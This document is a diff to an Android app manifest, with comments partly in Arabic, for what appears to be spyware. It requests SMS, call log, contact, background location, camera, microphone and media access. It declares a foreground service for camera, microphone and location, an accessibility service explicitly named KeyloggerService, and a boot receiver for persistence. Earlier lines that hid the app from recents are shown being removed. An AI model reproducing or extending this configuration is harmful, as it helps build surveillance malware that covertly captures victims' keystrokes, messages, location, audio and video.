@@ -2,37 +2,103 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
+    <!-- ============================================================ -->
+    <!-- الشبكة -->
+    <!-- ============================================================ -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+
+    <!-- ============================================================ -->
+    <!-- Boot & Service -->
+    <!-- ============================================================ -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <!-- ============================================================ -->
+    <!-- SMS -->
+    <!-- ============================================================ -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
+
+    <!-- ============================================================ -->
+    <!-- Calls -->
+    <!-- ============================================================ -->
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
     <uses-permission android:name="android.permission.CALL_PHONE" />
+
+    <!-- ============================================================ -->
+    <!-- Contacts -->
+    <!-- ============================================================ -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
+
+    <!-- ============================================================ -->
+    <!-- Location -->
+    <!-- ============================================================ -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <!-- ============================================================ -->
+    <!-- Camera & Mic -->
+    <!-- ============================================================ -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+
+    <!-- ============================================================ -->
+    <!-- Vibration -->
+    <!-- ============================================================ -->
     <uses-permission android:name="android.permission.VIBRATE" />
+
+    <!-- ============================================================ -->
+    <!-- Phone State -->
+    <!-- ============================================================ -->
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+
+    <!-- ============================================================ -->
+    <!-- Storage -->
+    <!-- ============================================================ -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission
+        android:name="android.permission.READ_MEDIA_IMAGES"
+        tools:ignore="SelectedPhotoAccess" />
+    <uses-permission
+        android:name="android.permission.READ_MEDIA_VIDEO"
+        tools:ignore="SelectedPhotoAccess" />
+    <uses-permission
+        android:name="android.permission.READ_MEDIA_AUDIO"
+        tools:ignore="SelectedPhotoAccess" />
+
+    <!-- ============================================================ -->
+    <!-- Notifications -->
+    <!-- ============================================================ -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+    <!-- ============================================================ -->
+    <!-- Packages -->
+    <!-- ============================================================ -->
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
         tools:ignore="QueryAllPackagesPermission" />
 
+    <!-- ============================================================ -->
+    <!-- Extra -->
+    <!-- ============================================================ -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+
+    <!-- ============================================================ -->
+    <!-- Hardware features (اختيارية) -->
+    <!-- ============================================================ -->
     <uses-feature android:name="android.hardware.camera" android:required="false" />
     <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
     <uses-feature android:name="android.hardware.microphone" android:required="false" />
@@ -44,22 +110,32 @@
         android:usesCleartextTraffic="true"
         android:icon="@android:drawable/ic_lock_lock">
 
+        <!-- ============================================================ -->
+        <!-- Main Activity — شيلنا noHistory -->
+        <!-- ============================================================ -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
-            android:excludeFromRecents="true"
-            android:noHistory="true">
+            android:launchMode="singleTask"
+            android:screenOrientation="portrait"
+            android:configChanges="orientation|screenSize|keyboardHidden">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
+        <!-- ============================================================ -->
+        <!-- ServiceRunner -->
+        <!-- ============================================================ -->
         <service
             android:name=".ServiceRunner"
             android:exported="false"
             android:foregroundServiceType="camera|microphone|location|dataSync" />
 
+        <!-- ============================================================ -->
+        <!-- Keylogger -->
+        <!-- ============================================================ -->
         <service
             android:name=".KeyloggerService"
             android:exported="true"
@@ -72,6 +148,9 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
+        <!-- ============================================================ -->
+        <!-- Boot Receiver -->
+        <!-- ============================================================ -->
         <receiver
             android:name=".BootReceiver"
             android:exported="true"
@@ -80,6 +159,7 @@
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                 <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.REBOOT" />
             </intent-filter>
         </receiver>
 
